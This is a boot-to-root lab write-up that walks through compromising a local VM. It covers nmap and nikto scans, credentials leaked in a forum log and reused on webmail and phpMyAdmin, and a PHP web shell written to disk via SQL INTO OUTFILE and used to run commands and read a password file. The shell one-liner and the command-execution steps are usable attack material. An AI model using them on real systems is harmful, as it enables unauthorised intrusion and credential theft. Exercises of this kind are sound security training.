Since bridged adapter is blocked in the school - I setup kali linux vm and boot-to-root vm through host-only adapter.
I created local network through *VirtualBox->File->Host network manager*, and it's ip *192.168.56.1/24*.
Now, there is a local network with kali vm, boot-to-root vm and host computer.
And kali will see only host computet and boot-to-root vm.
My kali linux ip is 192.168.56.101 (through * ip a *).
And we need to find out how can we interact with boot-to-root vm. For this I check all available ports im my local network with * nmap 192.168.56.1-225 *

For only one non host port in my local network I received:
Nmap scan report for 192.168.56.102
Host is up (0.0010s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

So boot-to-root vm running on 192.168.56.102 ip, and have few open ports.

On http there is site, which is pretty empty, I check it html source code and there is nothing interesting in it. 
After that I scanned it with * skipfish -o path_to_save http://192.168.56.102 * and * nikto -h http://192.168.56.102 *, and not found thomething interesting.

There is another open port which could be scanned, it's https.
using * nikto -h https://192.168.56.102 * we recieve few interesting dirs: forum, webmail, phpmyadmin

On forum there are 4 topics and only one is iteresting, topic *Probleme login* where user *lmezard* push logs with attempts to log in.

In these logs we can see, what username lmezard used trying to log in, it's *Failed password for invalid user 'username'* 
And there is interesting username in string * Failed password for invalid user !q\]Ej?*5K5cy*AJ *
And, these characters came up for lmezard password.

In lmezard profile we could see his email, so we go to webmail, and try the same password !q\]Ej?*5K5cy*AJ to his mail. And it's fits again.

In mail there is message * DB Access * which contains * Use root/Fg-'kKXBj87E:aJ$  *. It doesn't fit to ssh and ftp connection, but it's fit to phpmyadmin.

First of all I checked all tables in db, but all users passwords hashed and I didn't find any helpful information.
And another way to get access to server - is SQL injection through which you can access the shell.
(detailed articles about SQL injections https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/ https://www.informit.com/articles/article.aspx?p=1407358&seqNum=2)

* SELECT  '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/hack.php' *
templates_c - dir which always need write permission, used for compiled templates. I found it through *dirbuster* and brute force dirs to write access.

After that we can run something like this * https://192.168.56.102/forum/templates_c/hack.php?cmd=pwd * and it will show pwd output * /var/www/forum/templates_c *

After a little research, we can see LOOKATME dir in home dir with other users (I used curl because more convenient output):
* curl --insecure 'https://192.168.56.102/forum/templates_c/hack.php?cmd=ls%20-la%20/home' *

There is file password in LOOKATME dir, which contains * lmezard:G!@M6f4Eatau{sF" *

This password fit to ftp port, which contains README file - "Complete this little challenge and use the result as password for user 'laurie' to login in ssh", and fun file (which need to be solved).
(command 'get' to receive files through ftp)

File fun is archive (I found out it because of '0ustar' mark in file).
After unzipping (* tar -xf fun *)
There is a folder * ft_fun * with a lot of pcap files.
